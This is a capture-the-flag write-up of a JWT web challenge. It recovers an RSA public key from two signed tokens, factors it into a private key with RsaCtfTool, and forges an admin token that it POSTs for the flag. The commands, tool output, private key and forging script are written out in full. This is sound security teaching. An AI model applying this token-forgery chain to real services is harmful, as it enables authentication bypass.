![JWT Challenge](images/jwt-chal.png)

[https://web-jwt-b9766b1f.chal-2021.duc.tf/](https://web-jwt-b9766b1f.chal-2021.duc.tf/)

JWT stands for JSON Web Token

Visiting the challenge link returns this page:

```
from flask import Flask, request
import jwt, time, os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

private_key = open('priv').read()
public_key = open('pub').read()
flag = open('flag.txt').read()

@app.route("/get_token")
def get_token():
    return jwt.encode({'admin': False, 'now': time.time()}, private_key, algorithm='RS256')

@app.route("/get_flag", methods=['POST'])
def get_flag():
  try:
    payload = jwt.decode(request.form['jwt'], public_key, algorithms=['RS256'])
    if payload['admin']:
      return flag
  except:
    return ":("

@app.route("/")
def sauce():
  return "
%s
" % open(__file__).read()

if __name__ == "__main__":
  app.run(host="0.0.0.0", port=5000)
```

Good news!  There are only two web endpoints we need to study. :)

Bad news! I know of no way to brute force JWTs using RS256. :(

Let's start by just playing around with the endpoints.

# /get_token


[https://web-jwt-b9766b1f.chal-2021.duc.tf/get_token](https://web-jwt-b9766b1f.chal-2021.duc.tf/get_token)

We hit /get_token and get this response:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5vdyI6MTYzMjUzNjcyMC41NjkyMTk4fQ.DGGgcbIX160FUcUr6JWLn8HLGQM3n_DuIQ0tDx0AcTKXr_72_Z6LdMFo33yScKiobGFpjzlAg6lDMsCa4UkJqQfteA38Mo74B7ITHpjh0tnXrxejm20F-X23kTkKT_SLVw
```

We can see from the Python code the data that should be encoded inside this token.  However let's visit jwt.io just for fun.

[https://jwt.io/](https://jwt.io/)

We visit this site and then paste in the token we got back from **/get_token**:

![JWT](images/jwt1.png)

# /get_flag

Studying the Python code, it is clear that we need to forge a "valid" JWT with **"admin": true** and POSTing it to **/get_flag**.

In order to do this, we somehow need to obtain the private key that the code loads here:
```
private_key = open('priv').read()
```

However, there seems to be no way to convince the application to give this to us directly.

Neither is there any way to obtain even the public key.

# Plan of Attack
After some pondering, I reviewed some of my notes from previous CTFs and found these two pieces of information:

1. One CTF JWT challenge was solved by using a special tool to obtain the public key from **two** separately-generated JWTs.
2. Another CTF JWT challenge was solved by using a (different) special tool to obtain an RS256 private key from a "weak" public key.

Given this, my plan was to use the special tool from item 1 to obtain a public key and then hope that public key was weak and that the other special tool could generate the private key from it.  If that works, then we can forge a new JWT with **"admin": true** and POST it to **/get_flag**.

Let's try and see how it goes.

# Attack Part 1

I made two separate calls to **/get_token** and got these tokens:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5vdyI6MTYzMjUzNjcyMC41NjkyMTk4fQ.DGGgcbIX160FUcUr6JWLn8HLGQM3n_DuIQ0tDx0AcTKXr_72_Z6LdMFo33yScKiobGFpjzlAg6lDMsCa4UkJqQfteA38Mo74B7ITHpjh0tnXrxejm20F-X23kTkKT_SLVw

eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5vdyI6MTYzMjUzNjc0MS40NDAyMzA0fQ.DxCSrEVez5gtm_Xfjq1eaiGRf5PKNeYXti3loMHYMURKQdjILlp1dZlCSed1Y4R1B9mOsbAujxOYCLsdjQhzIbLV04XHZ96UOXH0dXaqNTb_PBxCsZ5ELs_CFX6qNm9MJA
```

Here is the special tool mentioned earlier:

[https://github.com/silentsignal/rsa_sign2n](https://github.com/silentsignal/rsa_sign2n)

## Setup Attempt 1
```
git clone git@github.com:silentsignal/rsa_sign2n.git
cd rsa_sign2n
cd standalone
pip3 install -r requirements.txt
```

## Execution Attempt 1
```
python3 jwt_forgery.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5vdyI6MTYzMjUzNjcyMC41NjkyMTk4fQ.DGGgcbIX160FUcUr6JWLn8HLGQM3n_DuIQ0tDx0AcTKXr_72_Z6LdMFo33yScKiobGFpjzlAg6lDMsCa4UkJqQfteA38Mo74B7ITHpjh0tnXrxejm20F-X23kTkKT_SLVw eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5vdyI6MTYzMjUzNjc0MS40NDAyMzA0fQ.DxCSrEVez5gtm_Xfjq1eaiGRf5PKNeYXti3loMHYMURKQdjILlp1dZlCSed1Y4R1B9mOsbAujxOYCLsdjQhzIbLV04XHZ96UOXH0dXaqNTb_PBxCsZ5ELs_CFX6qNm9MJA

Traceback (most recent call last):
  File "/Users/sambrow/hack_nobackup/rsa_sign2n/standalone/jwt_forgery.py", line 71, in <module>
    padded0 = PKCS1_v1_5.EMSA_PKCS1_V1_5_ENCODE(sha256_0, len(jwt0_sig_bytes))
AttributeError: module 'Crypto.Signature.PKCS1_v1_5' has no attribute 'EMSA_PKCS1_V1_5_ENCODE'
```

Argh! Something went wrong but I'm unsure how to troubleshoot it.

I then noticed a `Dockerfile` inside the `standalone` folder.

Yay!  I love Docker since it allows the package author to distribute a docker image that will have all of the dependencies it needs already correctly configured.  This solves the "it works on my computer but not on your computer" problem.

So, let's create this Docker image.

This assumes you've installed Docker already and are cd'd into the `rsa_sign2n/standalone` folder:

## Setup Attempt 2
```
# builds the image
docker build . -t sig2n

# starts the container and gives me a bash shell
docker run -it sig2n /bin/bash
```

This gives me a bash prompt like this:
```
root@2b3885dcfaca:/app#
```

## Execution Attempt 2
```
root@732dc2a48bc8:/app# python3 jwt_forgery.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5vdyI6MTYzMjUzNjcyMC41NjkyMTk4fQ.DGGgcbIX160FUcUr6JWLn8HLGQM3n_DuIQ0tDx0AcTKXr_72_Z6LdMFo33yScKiobGFpjzlAg6lDMsCa4UkJqQfteA38Mo74B7ITHpjh0tnXrxejm20F-X23kTkKT_SLVw eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5vdyI6MTYzMjUzNjc0MS40NDAyMzA0fQ.DxCSrEVez5gtm_Xfjq1eaiGRf5PKNeYXti3loMHYMURKQdjILlp1dZlCSed1Y4R1B9mOsbAujxOYCLsdjQhzIbLV04XHZ96UOXH0dXaqNTb_PBxCsZ5ELs_CFX6qNm9MJA

[*] GCD:  0x1d
[*] GCD:  0x108b7c75aee1e2b9df3692a2cc54b100d111002193ebc9c3cf575e4b16f595cc28d9b47a65d1f3774aa3db05649085589230fe23bfcc2ef876b4134dafde4484d7bde8c9b80016d9c9aed53a0334ae3483cc833374301e1a7829a5f5800a793803
[+] Found n with multiplier 1  :
 0x108b7c75aee1e2b9df3692a2cc54b100d111002193ebc9c3cf575e4b16f595cc28d9b47a65d1f3774aa3db05649085589230fe23bfcc2ef876b4134dafde4484d7bde8c9b80016d9c9aed53a0334ae3483cc833374301e1a7829a5f5800a793803
[+] Written to 108b7c75aee1e2b9_65537_x509.pem
[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6IGZhbHNlLCAibm93IjogMTYzMjUzNjcyMC41NjkyMTk4LCAiZXhwIjogMTYzMjYyMzE5OX0._rQf-v9lQvZInV6MBEjkBqzuEcPtx-gaobU0oHtjpHY'
[+] Written to 108b7c75aee1e2b9_65537_pkcs1.pem
[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6IGZhbHNlLCAibm93IjogMTYzMjUzNjcyMC41NjkyMTk4LCAiZXhwIjogMTYzMjYyMzE5OX0.-xQ_LSF9jJaAEdd2PCgPZjZVwlX8wAD4H2P7lTZOw84'
[+] Found n with multiplier 29  :
 0x920d1e8a71b85eaf6bd01744d6c84f79f7c2361f955f3bb7b3907e2cedfc567cfeadf290c09e76df43717bc5acb5265d51233f069d1c1a390f097e43db86c6c9a571f54cf72ced06f45fa0e5a0b68f0d5f53f8f259ef620424bf1a1ee5e0de9f
[+] Written to 920d1e8a71b85eaf_65537_x509.pem
[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6IGZhbHNlLCAibm93IjogMTYzMjUzNjcyMC41NjkyMTk4LCAiZXhwIjogMTYzMjYyMzE5OX0.V1XnPFpwKbK3IuFNChLZU0XkvMUyzjIKwSVQEyjIqIs'
[+] Written to 920d1e8a71b85eaf_65537_pkcs1.pem
[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6IGZhbHNlLCAibm93IjogMTYzMjUzNjcyMC41NjkyMTk4LCAiZXhwIjogMTYzMjYyMzE5OX0.a1fUyscIftGuetBSD1OnIKKY8p-DjMB6sIMJibWpnpM'
================================================================================
Here are your JWT's once again for your copypasting pleasure
================================================================================
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6IGZhbHNlLCAibm93IjogMTYzMjUzNjcyMC41NjkyMTk4LCAiZXhwIjogMTYzMjYyMzE5OX0._rQf-v9lQvZInV6MBEjkBqzuEcPtx-gaobU0oHtjpHY
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6IGZhbHNlLCAibm93IjogMTYzMjUzNjcyMC41NjkyMTk4LCAiZXhwIjogMTYzMjYyMzE5OX0.-xQ_LSF9jJaAEdd2PCgPZjZVwlX8wAD4H2P7lTZOw84
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6IGZhbHNlLCAibm93IjogMTYzMjUzNjcyMC41NjkyMTk4LCAiZXhwIjogMTYzMjYyMzE5OX0.V1XnPFpwKbK3IuFNChLZU0XkvMUyzjIKwSVQEyjIqIs
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6IGZhbHNlLCAibm93IjogMTYzMjUzNjcyMC41NjkyMTk4LCAiZXhwIjogMTYzMjYyMzE5OX0.a1fUyscIftGuetBSD1OnIKKY8p-DjMB6sIMJibWpnpM
```

We can ignore all the output and focus on these two lines:

```
[+] Written to 108b7c75aee1e2b9_65537_x509.pem
[+] Written to 920d1e8a71b85eaf_65537_x509.pem
```

These are the TWO possible public keys that it generated from the tokens we gave it.

From experience, this is probabilistic.  At first I tried two **different** tokens and it generated SIX possible public keys.  I didn't want to try all of those so I just generated two new tokens and re-ran it.  I got lucky then in that it generated only TWO.

Let's see what the first public key looks like:

```
root@732dc2a48bc8:/app# cat 108b7c75aee1e2b9_65537_x509.pem
-----BEGIN PUBLIC KEY-----
MHwwDQYJKoZIhvcNAQEBBQADawAwaAJhEIt8da7h4rnfNpKizFSxANERACGT68nD
z1deSxb1lcwo2bR6ZdHzd0qj2wVkkIVYkjD+I7/MLvh2tBNNr95EhNe96Mm4ABbZ
ya7VOgM0rjSDzIMzdDAeGngppfWACnk4AwIDAQAB
-----END PUBLIC KEY-----
```

We'll run with this for now and return to get the second public key if needed.

# Attack Part 2

Now that we have a public key, let's use the other special tool to see if we can generate a private key from it (which is only possible if it is a "weak" public key).

## Setup

In this case here is the special tool we need:

[https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)

```
git clone git@github.com:Ganapati/RsaCtfTool.git
cd RsaCtfTool
pip3 install -r requirements.txt
```

## Execution

I first setup a local file called `public.key` with the key we found earlier:

```
-----BEGIN PUBLIC KEY-----
MHwwDQYJKoZIhvcNAQEBBQADawAwaAJhEIt8da7h4rnfNpKizFSxANERACGT68nD
z1deSxb1lcwo2bR6ZdHzd0qj2wVkkIVYkjD+I7/MLvh2tBNNr95EhNe96Mm4ABbZ
ya7VOgM0rjSDzIMzdDAeGngppfWACnk4AwIDAQAB
-----END PUBLIC KEY-----
```

We can then use this special took to try to generate a private key:

```
python3 RsaCtfTool.py --publickey ./public.key --private

[*] Testing key ./public.key.
[*] Performing pastctfprimes attack on ./public.key.
\297337.74it/s]
[*] Performing system_primes_gcd attack on ./public.key.
  0%|▍                                                                                                                                            | 21/7007 [00:00<00:08, 789.12it/s]
[*] Attack success with system_primes_gcd method !

Results for ./public.key:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIIB+wIBAAJhEIt8da7h4rnfNpKizFSxANERACGT68nDz1deSxb1lcwo2bR6ZdHz
d0qj2wVkkIVYkjD+I7/MLvh2tBNNr95EhNe96Mm4ABbZya7VOgM0rjSDzIMzdDAe
GngppfWACnk4AwIDAQABAmEKpfUIG6wBMAOtnv0vdki0XiDfW6KTMDRDvdcjryUd
sIi8WaAV8ZW9z9XWw/v8U/4DrOzW5nJwm2BwMRfpIfKlS/QW0gX/TR+btntJc6P8
wnks0vynK8S9A+l4kegxYrSxAmEAkg0einG4Xq9r0BdE1shPeffCNh+VXzu3s5B+
LO38Vnz+rfKQwJ5230Nxe8WstSZdUSM/Bp0cGjkPCX5D24bGyaVx9Uz3LO0G9F+g
5aC2jw1fU/jyWe9iBCS/Gh7l4N6fAgEdAmBhCOJfrQqHrhj9WlhcMx3KtTeNahJ+
AVkdrkSGaV+bvtQekehmcWIdF9wQFdeXS3P4cmhvZnbDXWGGNyOyeKseUhOSnJ4k
dR6HwflOVyaziHjre5zY79i5VAi7vAeTDZUCAQUCYG7MKNL1KsNqmGjlg6vEGPts
ga15EDaXO+lTIe0eeM7aaO3kJzEFdKlfTUNp0nfE1AiWUx+AA6n2UgczpjybNbN0
rroXE8nOS+WGVr/bBhQ/HC4MTevzZNcBZNYFyN+OZw==
-----END RSA PRIVATE KEY-----
```

It worked!

# Attack Part 3

Armed with a private key, let's go back to jwt.io to try to forge our desired token.

We first edit:

```
"admin": true
```

and then paste our private token into the second box in the VERIFY SIGNATURE section:

![JWT Forge](images/jwt-forge.png)

This then generated a token on the left side.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZG1pbiI6dHJ1ZSwibm93IjoxNjMyNTM2NzYxLjQ2NTE3MzJ9.Chjv26Mt7SJ9A0h2Mf25nwjvpf4Lb8cTj2QliJDPZrPlXVC37LI3fcLylLezLe-wtJz3mGAY1FRvIqvoaie4OBiwygZ_DrTtwiIj5tkbcgbJeHf3M8qEB8pFwQGaDwh1Tg
```


# Attack Part 4

Let's now try POSTing this to `/get_flag`.

There are many tools you can use (PostMan) but I like to use Burp Suite's **Repeater** tab.  This allows me to edit the HTTP request any way I like.

It is important to add the Content-Type correctly:

`Content-Type: application/x-www-form-urlencoded`

```
POST /get_flag HTTP/2
Host: web-jwt-b9766b1f.chal-2021.duc.tf
Sec-Ch-Ua: "Chromium";v="93", " Not;A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 224

jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZG1pbiI6dHJ1ZSwibm93IjoxNjMyNTM2NzYxLjQ2NTE3MzJ9.Chjv26Mt7SJ9A0h2Mf25nwjvpf4Lb8cTj2QliJDPZrPlXVC37LI3fcLylLezLe-wtJz3mGAY1FRvIqvoaie4OBiwygZ_DrTtwiIj5tkbcgbJeHf3M8qEB8pFwQGaDwh1Tg
```

And this is the HTTP response that came back:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 25 Sep 2021 02:37:24 GMT
Server: nginx/1.21.1
Strict-Transport-Security: max-age=15552000
Content-Length: 27

DUCTF{json_web_trickeryyy}
```

WOOT!

I thought this was a great challenge since it chained together two totally different independent vulnerabilities in order to solve it.


# Notes Added Later

When someone tried to follow these steps, they found that jwt.io could not be used to generate the forged token.  Indeed, when I went back to try it, I was unable to get jwt.io to generate this token either!  I can't explain why it worked for me originally.  I'm glad I took a screenshot to prove it.

Here's an easy alternate way to generate the forged token.

Create a python file containing the following and run it to get the forged token:
```
import jwt

private_key = """-----BEGIN RSA PRIVATE KEY-----
MIIB+wIBAAJhEIt8da7h4rnfNpKizFSxANERACGT68nDz1deSxb1lcwo2bR6ZdHz
d0qj2wVkkIVYkjD+I7/MLvh2tBNNr95EhNe96Mm4ABbZya7VOgM0rjSDzIMzdDAe
GngppfWACnk4AwIDAQABAmEKpfUIG6wBMAOtnv0vdki0XiDfW6KTMDRDvdcjryUd
sIi8WaAV8ZW9z9XWw/v8U/4DrOzW5nJwm2BwMRfpIfKlS/QW0gX/TR+btntJc6P8
wnks0vynK8S9A+l4kegxYrSxAmEAkg0einG4Xq9r0BdE1shPeffCNh+VXzu3s5B+
LO38Vnz+rfKQwJ5230Nxe8WstSZdUSM/Bp0cGjkPCX5D24bGyaVx9Uz3LO0G9F+g
5aC2jw1fU/jyWe9iBCS/Gh7l4N6fAgEdAmBhCOJfrQqHrhj9WlhcMx3KtTeNahJ+
AVkdrkSGaV+bvtQekehmcWIdF9wQFdeXS3P4cmhvZnbDXWGGNyOyeKseUhOSnJ4k
dR6HwflOVyaziHjre5zY79i5VAi7vAeTDZUCAQUCYG7MKNL1KsNqmGjlg6vEGPts
ga15EDaXO+lTIe0eeM7aaO3kJzEFdKlfTUNp0nfE1AiWUx+AA6n2UgczpjybNbN0
rroXE8nOS+WGVr/bBhQ/HC4MTevzZNcBZNYFyN+OZw==
-----END RSA PRIVATE KEY-----"""

token = jwt.encode({'admin': True, 'now': 1632536761.4651732}, private_key, algorithm='RS256')
print(token)
```

This outputs the same forged token that I, somehow, got out of jwt.io.

Wow!

I tried jwt.io using the way back machine from just a week earlier and that version **does** produce the token when you paste in the private key.

This proves their behavior changed sometime after I had used their site to solve this challenge.

You can try it out here:

[https://web.archive.org/web/20210914035237/https://jwt.io/](https://web.archive.org/web/20210914035237/https://jwt.io/)
